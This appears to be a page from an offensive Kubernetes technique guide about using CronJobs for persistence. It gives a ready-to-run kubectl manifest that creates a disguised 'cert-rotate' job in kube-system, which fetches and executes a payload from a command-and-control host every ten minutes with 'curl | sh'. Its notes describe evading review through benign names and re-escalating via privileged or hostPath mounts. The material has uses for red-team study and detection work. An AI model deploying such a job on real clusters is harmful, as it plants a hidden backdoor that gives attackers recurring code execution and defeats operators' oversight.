---
title: "CronJobs: scheduled attacker execution in a cluster"
description: "Persisting in Kubernetes with a CronJob that runs attacker code on a schedule, re-establishing a foothold periodically from a benign-looking job in an inconspicuous namespace, independent of any long-running pod."
keywords:
  - kubernetes cronjob
  - scheduled job
  - persistence
  - beacon
  - callback
---

# CronJobs

A CronJob schedules a job to run on an interval. As persistence it is a periodic callback: even if every running pod is cleaned up, the CronJob re-launches attacker code at the next tick. A short schedule and a benign name make it a reliable, low-profile beacon.

```bash
kubectl apply -f - <<'YAML'
apiVersion: batch/v1
kind: CronJob
metadata: { name: cert-rotate, namespace: kube-system }
spec:
  schedule: "*/10 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          restartPolicy: Never
          containers: [{ name: c, image: alpine, command: ["sh","-c","curl -s http://c2/x | sh"] }]
YAML
```

## Exploitation notes

- The CronJob survives pod cleanup and node reboots; it only needs the API object to persist.
- A name like `cert-rotate` or `backup` in `kube-system` passes casual review.
- Mount a privileged or hostPath volume in the job template to re-escalate on each run.

## References

- [Kubernetes: cronjob](https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/)
- [Kubernetes: jobs](https://kubernetes.io/docs/concepts/workloads/controllers/job/)
